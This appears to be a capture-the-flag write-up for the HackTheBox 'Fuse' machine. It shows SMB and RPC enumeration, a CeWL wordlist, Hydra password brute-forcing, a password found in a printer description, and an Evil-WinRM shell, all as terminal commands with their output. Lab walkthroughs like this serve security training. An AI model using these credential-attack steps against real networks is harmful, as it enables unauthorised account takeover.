@@ -1,0 +1,354 @@
+Getting to the next port, SMB we fin anonymous login is open
+
+┌─[ashhad@parrot]─[~/Documents/htb/fuse]
+└──╼ $smbclient -L fuse.htb
+Enter WORKGROUP\ashhad's password: 
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+SMB1 disabled -- no workgroup available
+
+
+Trying enum4Linux also gave no result
+
+┌─[ashhad@parrot]─[~/Documents/htb/fuse]
+└──╼ $enum4linux fuse.htb
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Aug 23 19:30:34 2020
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... fuse.htb
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ================================================ 
+|    Enumerating Workgroup/Domain on fuse.htb    |
+ ================================================ 
+[E] Can't find workgroup/domain
+
+
+ ======================================== 
+|    Nbtstat Information for fuse.htb    |
+ ======================================== 
+Looking up status of 10.10.10.193
+No reply from 10.10.10.193
+
+ ================================= 
+|    Session Check on fuse.htb    |
+ ================================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
+[+] Server fuse.htb allows sessions using username '', password ''
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
+[+] Got domain/workgroup name: 
+
+ ======================================= 
+|    Getting domain SID for fuse.htb    |
+ ======================================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
+Domain Name: FABRICORP
+Domain Sid: S-1-5-21-2633719317-1471316042-3957863514
+[+] Host is part of a domain (not a workgroup)
+
+ ================================== 
+|    OS information on fuse.htb    |
+ ================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for fuse.htb from smbclient: 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
+[+] Got OS info for fuse.htb from srvinfo:
+Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+
+ ========================= 
+|    Users on fuse.htb    |
+ ========================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
+[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
+[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+ ===================================== 
+|    Share Enumeration on fuse.htb    |
+ ===================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
+
+	Sharename       Type      Comment
+	---------       ----      -------
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on fuse.htb
+
+ ================================================ 
+|    Password Policy Information for fuse.htb    |
+ ================================================ 
+[E] Unexpected error from polenum:
+
+
+[+] Attaching to fuse.htb using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+	[!] Protocol failed: Cannot request session (Called Name:FUSE.HTB)
+
+[+] Trying protocol 445/SMB...
+
+	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
+
+[E] Failed to get password policy with rpcclient
+
+
+ ========================== 
+|    Groups on fuse.htb    |
+ ========================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
+
+[+] Getting builtin groups:
+
+[+] Getting builtin group memberships:
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
+
+[+] Getting local groups:
+
+[+] Getting local group memberships:
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.
+
+[+] Getting domain groups:
+
+[+] Getting domain group memberships:
+
+ =================================================================== 
+|    Users on fuse.htb via RID cycling (RIDS: 500-550,1000-1050)    |
+ =================================================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
+[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
+
+ ========================================= 
+|    Getting printer info for fuse.htb    |
+ ========================================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
+Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Sun Aug 23 19:31:31 2020
+
+
+#######################################################################################
+Since we had users tried bruteforcing 
+_________________________________________________________________________________
+
+
+┌─[ashhad@parrot]─[~/Documents/htb/fuse]
+└──╼ $hydra -L users.txt -P /usr/share/wordlists/rockyou.txt.gz 10.10.10.193 smb -V
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-23 19:41:36
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+
+
+THis gave no results. SInce we had the usernames from the application, passwords too gcould be taken from it. Cewl was used to create a word list
+
+┌─[ashhad@parrot]─[~/Documents/htb/fuse]
+└──╼ $cewl -d 5 -m 3 -w passwords.txt  http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers
+CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+
+
+┌─[ashhad@parrot]─[~/Documents/htb/fuse]
+└──╼ $wc passwords.txt 
+ 169  169 1166 passwords.txt
+
+
+THis list was used in the above command
+
+┌─[ashhad@parrot]─[~/Documents/htb/fuse]
+└──╼ $hydra -L users.txt -P passwords.txt 10.10.10.193 smb -V
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-23 19:43:23
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+
+
+[445][smb] host: 10.10.10.193   login: tlavel   password: Fabricorp01
+
+
+[445][smb] host: 10.10.10.193   login: bhult   password: Fabricorp01
+
+got two hits.
+
+using these
+
+┌─[✗]─[ashhad@parrot]─[~/Documents/htb/fuse]
+└──╼ $smbclient -L fuse.htb -U tlavel
+Enter WORKGROUP\tlavel's password: 
+session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
+
+Googling this error told us that password needs to be changed to login. changed the password to test
+
+Which didn't work  ;D
+
+┌─[✗]─[ashhad@parrot]─[~/Documents/htb/fuse]
+└──╼ $smbpasswd -r fuse.htb -U tlavel
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+machine fuse.htb rejected the password change: Error was : When trying to update a password, this status indicates that some password update rule has been violated. For example, the password might not meet length criteria..
+
+Looks like they have good controls.. Will change try again ( Test@1234 ). It worked.
+
+used enum4linux again ┌─[ashhad@parrot]─[~/Documents/htb/fuse]
+└──╼ $enum4linux -u tlavel -p Test@1234 fuse.htb
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Aug 23 20:04:38 2020
+
+(For some neither this nor evil-winrm worked but rpcclient worked)
+
+┌─[ashhad@parrot]─[~/Documents/htb/fuse]
+└──╼ $rpcclient -U FABRICORP\\tlavel 10.10.10.193
+Enter FABRICORP\tlavel's password: 
+rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[svc-print] rid:[0x450]
+user:[bnielson] rid:[0x451]
+user:[sthompson] rid:[0x641]
+user:[tlavel] rid:[0x642]
+user:[pmerton] rid:[0x643]
+user:[svc-scan] rid:[0x645]
+user:[bhult] rid:[0x1bbd]
+user:[dandrews] rid:[0x1bbe]
+user:[mberbatov] rid:[0x1db1]
+user:[astein] rid:[0x1db2]
+user:[dmuir] rid:[0x1db3]
+
+rpcclient $> enumdomgroups
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Schema Admins] rid:[0x206]
+group:[Enterprise Admins] rid:[0x207]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[Key Admins] rid:[0x20e]
+group:[Enterprise Key Admins] rid:[0x20f]
+group:[DnsUpdateProxy] rid:[0x44e]
+group:[IT_Accounts] rid:[0x644]
+
+
+rpcclient $> enumprivs
+found 35 privileges
+
+SeCreateTokenPrivilege 		0:2 (0x0:0x2)
+SeAssignPrimaryTokenPrivilege 		0:3 (0x0:0x3)
+SeLockMemoryPrivilege 		0:4 (0x0:0x4)
+SeIncreaseQuotaPrivilege 		0:5 (0x0:0x5)
+SeMachineAccountPrivilege 		0:6 (0x0:0x6)
+SeTcbPrivilege 		0:7 (0x0:0x7)
+SeSecurityPrivilege 		0:8 (0x0:0x8)
+SeTakeOwnershipPrivilege 		0:9 (0x0:0x9)
+SeLoadDriverPrivilege 		0:10 (0x0:0xa)
+SeSystemProfilePrivilege 		0:11 (0x0:0xb)
+SeSystemtimePrivilege 		0:12 (0x0:0xc)
+SeProfileSingleProcessPrivilege 		0:13 (0x0:0xd)
+SeIncreaseBasePriorityPrivilege 		0:14 (0x0:0xe)
+SeCreatePagefilePrivilege 		0:15 (0x0:0xf)
+SeCreatePermanentPrivilege 		0:16 (0x0:0x10)
+SeBackupPrivilege 		0:17 (0x0:0x11)
+SeRestorePrivilege 		0:18 (0x0:0x12)
+SeShutdownPrivilege 		0:19 (0x0:0x13)
+SeDebugPrivilege 		0:20 (0x0:0x14)
+SeAuditPrivilege 		0:21 (0x0:0x15)
+SeSystemEnvironmentPrivilege 		0:22 (0x0:0x16)
+SeChangeNotifyPrivilege 		0:23 (0x0:0x17)
+SeRemoteShutdownPrivilege 		0:24 (0x0:0x18)
+SeUndockPrivilege 		0:25 (0x0:0x19)
+SeSyncAgentPrivilege 		0:26 (0x0:0x1a)
+SeEnableDelegationPrivilege 		0:27 (0x0:0x1b)
+SeManageVolumePrivilege 		0:28 (0x0:0x1c)
+SeImpersonatePrivilege 		0:29 (0x0:0x1d)
+SeCreateGlobalPrivilege 		0:30 (0x0:0x1e)
+SeTrustedCredManAccessPrivilege 		0:31 (0x0:0x1f)
+SeRelabelPrivilege 		0:32 (0x0:0x20)
+SeIncreaseWorkingSetPrivilege 		0:33 (0x0:0x21)
+SeTimeZonePrivilege 		0:34 (0x0:0x22)
+SeCreateSymbolicLinkPrivilege 		0:35 (0x0:0x23)
+SeDelegateSessionUserImpersonatePrivilege 		0:36 (0x0:0x24)
+
+rpcclient $> enumprinters
+	flags:[0x800000]
+	name:[\\10.10.10.193\HP-MFT01]
+	description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
+	comment:[]
+
+
+This gave a password string. No user. will bruteforce again with the updated user lits
+
+┌─[✗]─[ashhad@parrot]─[~/Documents/htb/fuse]
+└──╼ $cat users.txt 
+Administrator
+Guest
+krbtgt
+DefaultAccount
+svc-print
+bnielson
+svc-scan
+dandrews
+mberbatov
+astien
+dmuir
+pmerton
+tlavel
+sthompson
+bhult
+administrator
+
+
+┌─[✗]─[ashhad@parrot]─[~/Documents/htb/fuse]
+└──╼ $hydra -L users.txt -p '$fab@s3Rv1ce$1' 10.10.10.193 smb -f   (don't forget the quotes !! )
+
+[445][smb] host: 10.10.10.193   login: svc-print   password: $fab@s3Rv1ce$1
+
+
+We have user for the password. let's see what we can do here
+
+┌─[✗]─[ashhad@parrot]─[~/Documents/htb/fuse]
+└──╼ $evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i fuse.htb 
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-print\Documents> cd ..
+*Evil-WinRM* PS C:\Users\svc-print> cd Desktop
+*Evil-WinRM* PS C:\Users\svc-print\Desktop> ls
+
+
+    Directory: C:\Users\svc-print\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        8/22/2020   9:23 AM             34 user.txt
+
+
+
+
+
+
+
+
+
